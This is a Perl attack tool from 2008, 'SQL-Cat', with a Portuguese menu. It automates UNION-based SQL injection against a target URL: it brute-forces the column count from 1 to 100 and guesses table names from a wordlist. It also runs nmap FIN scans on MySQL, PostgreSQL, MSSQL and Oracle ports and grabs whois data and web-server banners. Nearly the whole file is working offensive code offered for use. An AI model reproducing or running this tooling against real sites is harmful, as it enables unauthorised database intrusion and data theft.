#!/usr/bin/perl 
# CODED BY Cooler_
# 12/05/2008
# c00f3r@gmail.com
# THANKS _Mlk_
############################################ Modules
 use LWP::UserAgent;
 use IO::Socket::INET;
 use Net::Whois::Raw;
 use Term::ANSIColor;
 use strict;
 use warnings;
########################### if not use proxy set to zero
my $proxy="0";
########################### konsole color
print color 'magenta on_black';
########################### tables names
my $lista_tabelas="tabs.txt";
########################### url gen
my $fileurl="urls.txt";
########################### response results
my $colunas="colunas.txt";
my $tabelas="tabelas.txt";
########################## nmap local
my $path="/usr/bin/nmap";
########################## nmap config ports
########################## "3306-MySQL","5432-postgreSQL","1433,1434-MsSQL","1521-Oracle 9g"
my $ports="3306,5432,1433,1434,1521";
my $option="-sF";
########################## ! Magic Word 
my $magic="The number of columns in two selected tables or queries of a union query do not match";
my $magic2="error";
my $magic3="Error";
########################## Magix word 
my $magic0="The number of columns in two selected tables or queries of a union query do not match";
&programa();

sub retorna() {
print "precione qualquer enter para retornar ao Menu\n";
while(<STDIN>) {
  if($_ =~ /.*/) { print "OK\n retornando ao menu\n"; sleep 1; programa(); }
 }
}

sub limpa() {
 my $cmd=0; my $sys="$^O";
 if($sys eq "linux") { $cmd="clear"; } else {  $cmd="cls"; }
 print `$cmd`;
}

sub entrada() {
while(<STDIN>) {
  if($_ =~ /[0-4]{1}/) { return($_); }
  print "digite numero de opção válida\n";
 }
}

sub spyder() {
 unlink("resposta.txt");
 my @page=@_; my $site=$page[0]; my $ua = new LWP::UserAgent;
 $ua->agent('Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12');
 if($proxy!=0) {$ua->env_proxy(); $ua->proxy("http", "http://$proxy/"); }
 my $pedido1 = new HTTP::Request GET =>"$site";
 my $resposta1 = $ua->request($pedido1) or die "Erro no site scanner\n"; my $res1 = $resposta1->content;
 open (OUT, ">>resposta.txt"); print OUT "$res1\n"; close(OUT);
}     
########################## test columns
sub RegexColuna() {
 my $result=1;
 open(OUT,"<resposta.txt"); 
   foreach (<OUT>) { if ($_ =~ m/$magic|$magic2|$magic3/) { $result-=1; last; } }
 close OUT; return $result;
}   
######################### test tables
sub RegexTabela() {
 my $result=0;
 open(OUT,"<resposta.txt"); 
   foreach (<OUT>) { if ($_ =~ m/$magic0/) { $result+=1; last; } }
 close OUT; return $result;
}   
######################### Banner 
sub header() {
print q{ 
	                
	                   .'\   /`.
	                 .'.-.`-'.-.`.
	            ..._:   .-. .-.   :_...
	          .'    '-.(o ) (o ).-'    `.
	         :  _    _ _`~(_)~`_ _    _  :
	        :  /:   ' .-=_   _=-. `   ;\  :
	        :   :|-.._  '     `  _..-|:   :
	         :   `:| |`:-:-.-:-:'| |:'   :
	          `.   `.| | | | | | |.'   .'
	            `.   `-:_| | |_:-'   .'
	              `-._   ````    _.-'
	                  ``-------''  
CRAZY
  _________________  .____              _________         __   
 /   _____/\_____  \ |    |             \_   ___ \_____ _/  |_ 
 \_____  \  /  / \  \|    |      ______ /    \  \/\__  \\   __\
 /        \/   \_/   \    |___  /_____/ \     \____/ __ \|  |  
/_______  /\_____\ \_/_______ \          \______  (____  /__|  
        \/        \__>       \/                 \/     \/     
                                                     Version 0.2
                                                     ------------
=================================================================
         Coded By Cooler_   
            Thanks _MLK_        12/05/2008
=================================================================
}
}
######################### ask banner
sub question() {
print q{
 CHoice one ? 
-------------------------------------------------
0- EXIT
1- Search Columns of URL
2- Search Tables of URL
3- list ports of SGBDs 
4- "WHois" and HostPredict 
-------------------------------------------------

}
}        

sub programa() {
 limpa(); header(); sleep 1; question(); sleep 1;
 chomp(my $escolha=entrada());
 print "your input:  $escolha OK\n";

 if(!$escolha) { print "exit\n"; sleep 1; limpa(); print color 'reset'; exit; }
 
 if($escolha eq 1) {
  print "Extract columns\nenter URL\n"; 
  chomp(my $site=<STDIN>); my $url="$site"; 
  print "enter table name\n"; chomp(my $table=<STDIN>);
  my $query1="+union+select+0"; my $query2="+from+$table";
  my $x; my $link.="$url"."$query1";
  my @list;
  $list[0]=$link;
  for($x=1; $x<=100; $x++) { $link.=",".$x; $list[$x]=$link; }
  my @triad; my $var; 
  for($x=0; $x<=100; $x++) { $triad[$x]="$list[$x]"."$query2"."\n";  }
  open my $out,  '>', $fileurl; print {$out} @triad; close $out;
  print "extract columns\n";
  foreach(@triad) { 
  my $site="$_"; &spyder($site); 
  my $select=RegexColuna();  
  if(!$select) { } else { 
   print "the link: $site\n column here\n------\n"; 
   open (OUT, ">>$colunas"); 
   print OUT "the link: $site\n column here\n---------\n"; 
   close(OUT); print "save results at $colunas\n"; retorna();
   } 
  }
 }

 if($escolha eq 2) {
  print "extract tables\nenter url\n";
  chomp(my $site=<STDIN>);  
  my $query="+union+select+0+from+"; 
  open (my $read, "<$lista_tabelas")|| die "erro in open file $lista_tabelas $!\n";
  my @triad;
  while(<$read>) {
    my $var="$_"; my $url.="$site"."$query"."$var"; push(@triad, "$url"); 
  }
  close $read;  
  foreach(@triad) { 
   my $site="$_"; print "$site\n";
   &spyder($site); 
   my $select=RegexTabela();  
   if(!$select) { } else { 
    print "the link: $site\n table here\n------\n"; 
    open (OUT, ">>$tabelas"); 
    print OUT "the link: $site\n table here\n---------\n"; 
    close(OUT); print "results at $tabelas\n"; retorna();
   } 
  }
 }
 
 if($escolha eq 3) {
  print "put the target\n"; chomp(my $ip=<STDIN>);
  my @paper=`$path $option $ip -p $ports`;
  print "\tSearch SGBDs  $ip\n";
  foreach(@paper) {
   if($_ =~ /Nmap|Interesting/){}else{
    $_ =~ s/open/Aberta/g; $_ =~ s/closed/Fechada/g; $_ =~ s/filtered/filtrada/g;
    $_ =~ s/PORT/PORTA/g; $_ =~ s/STATE/ESTADO/g; $_ =~ s/SERVICE/SERVIÇO/g;
    print "\t$_";
   }
  } 
  print "Nmap scan ends\n"; retorna();
 }

 if($escolha eq 4) { 
  print "put the target\n"; chomp(my $site=<STDIN>);
  my $whois=whois($site); print $whois;
  my $socket = IO::Socket::INET->new(
                                       PeerAddr => "$site",
                                       PeerPort => "80",
                                       Timeout => "7",
                                       Proto => "tcp"
  );
  die "socket fail\n" unless $socket;
  if ($socket) {
  print $socket "GET /index.html HTTP/1.0\r\n\r\n";
  while (<$socket>) {
  if ($_ =~ /Version:|Server:|Powered/){
  print "$_"; }
  }}
  my $ip = inet_ntoa(inet_aton($site));
  print "IP:$ip\n";
  close($socket); retorna();
 }
}
